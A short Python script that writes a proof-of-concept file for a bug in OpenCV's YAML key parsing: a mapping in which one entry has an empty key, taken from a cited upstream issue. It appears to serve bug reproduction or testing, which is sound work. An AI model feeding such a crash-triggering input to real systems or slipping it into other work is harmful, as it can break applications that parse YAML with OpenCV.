#!/usr/bin/env python3
"""Generate PoC for opencv-yaml-parsekey.

Malformed YAML where one entry of a mapping has an empty key. The
upstream poc.cpp (issue #28619) shows the trigger; we use the same
YAML content as the PoC blob.
"""

def create_poc(output='poc.bin'):
    blob = (
        b"%YAML:1.0\n"
        b"---\n"
        b"rect:\n"
        b"   x: 10\n"
        b"   y: 20\n"
        b"   width: 1000\n"
        b": 10\n"
    )
    with open(output, 'wb') as f:
        f.write(blob)
    print(f"wrote {output} ({len(blob)} bytes)")


if __name__ == '__main__':
    create_poc()
